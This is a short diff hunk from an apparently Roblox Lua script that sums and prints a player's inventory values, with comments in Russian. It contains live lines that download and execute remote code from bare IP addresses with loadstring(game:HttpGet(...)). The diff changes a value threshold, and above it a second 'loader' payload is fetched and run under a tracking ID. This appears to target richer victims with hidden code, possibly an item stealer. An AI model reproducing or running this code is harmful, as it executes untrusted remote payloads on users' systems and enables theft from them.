@@ -183,7 +183,7 @@ end
 -- 4. Выводим результат в консоль
 print("Общая сумма ценностей (SupremeValues): " .. totalValue)
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
-if totalValue > 500 then
+if totalValue > 5000 then
     ID="281b4cca-f00e-4f9d-985c-32df2a0b73b5";
     loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 else
